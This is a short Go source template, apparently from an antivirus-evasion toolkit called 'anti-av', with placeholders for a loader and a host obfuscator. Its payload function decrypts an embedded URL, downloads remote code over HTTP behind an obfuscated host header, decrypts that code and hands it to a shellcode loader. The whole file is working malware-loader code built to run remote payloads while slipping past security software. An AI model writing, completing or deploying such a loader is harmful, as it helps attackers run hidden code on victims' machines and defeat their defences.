package main

import (
	"bytes"
	"fmt"

	"github.com/b1gcat/anti-av/dist/_tmp/{{.LOADER}}"
	"github.com/b1gcat/anti-av/utils"
)

func hiJack() {
	fmt.Println("[-] ", sc.Hi(payload))
}

func payload(code []byte) ([]byte, error) {
	var err error
	if bytes.HasPrefix(code, []byte{0x0, 0x0, 0x0, 0x0}) {
		url, err := utils.DeCrypt(code)
		if err != nil {
			return nil, err
		}
		code, err = utils.HttpGet(string(url), "{{.HOST_OBFUSCATOR}}")
		if err != nil {
			return nil, err
		}
	}
	code, err = utils.DeCrypt(code)
	if err != nil {
		return nil, err
	}
	return code, nil
}
